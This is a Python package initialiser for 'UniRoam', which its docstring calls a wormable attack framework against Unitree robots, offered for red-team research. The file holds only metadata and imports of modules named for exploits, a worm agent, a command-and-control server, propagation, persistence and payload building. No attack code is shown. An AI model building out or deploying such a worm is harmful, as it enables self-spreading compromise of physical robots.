#!/usr/bin/env python3
"""
UniRoam - Autonomous Robot Worm Framework
Where UniPwn meets autonomous roaming

A comprehensive wormable attack framework for security research
and red team operations targeting Unitree robotic platforms.
"""

__version__ = "1.0.0"
__author__ = "UniRoam Development Team"
__license__ = "CC BY-NC-SA 4.0"

# Core modules
from . import config
from . import exploit_lib
from . import worm_agent
from . import c2_server
from . import propagation_engine
from . import persistence
from . import payload_builder
from . import opsec_utils

__all__ = [
    'config',
    'exploit_lib',
    'worm_agent',
    'c2_server',
    'propagation_engine',
    'persistence',
    'payload_builder',
    'opsec_utils',
]

